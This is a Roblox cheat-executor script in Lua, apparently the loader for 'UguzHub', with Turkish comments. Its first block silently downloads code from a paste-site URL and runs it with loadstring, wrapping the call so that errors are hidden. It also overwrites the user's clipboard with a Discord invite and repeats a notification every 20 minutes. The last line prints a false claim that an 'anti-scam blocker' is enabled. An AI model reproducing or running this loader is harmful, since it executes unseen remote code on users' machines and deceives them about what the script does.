-- 1. Main Menu (Yeni Link)
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://cdn.sourceb.in/bins/NQv1cnWw9r/0"))()
    end)
end)

local StarterGui = game:GetService("StarterGui")
local SetClipboard = setclipboard or toclipboard or syn_clip_insert

local discordLink = "https://discord.gg/tThSKeCuN" -- Buraya kendi Discord davet linkini yaz

-- Bildirim Gönderme ve Panoya Kopyalama Fonksiyonu
local function sendNotification()
    -- Linki otomatik panoya kopyalar
    if SetClipboard then
        SetClipboard(discordLink)
    end

    -- Ekranın sağ alt köşesinde Roblox sistem bildirimi çıkarır
    StarterGui:SetCore("SendNotification", {
        Title = "UguzHub Notification",
        Text = "Discord sunucumuza katılın! (Link panoya kopyalandı)",
        Duration = 5,
        Button1 = "Tamam"
    })
end

-- Script çalıştırıldığında ilk bildirimi anında gönder
sendNotification()

-- Her 20 dakikada bir (1200 saniye) bildirimi tekrarla
task.spawn(function()
    while wait(1200) do
        sendNotification()
    end
end)

print("anti-scam blocker enabled")
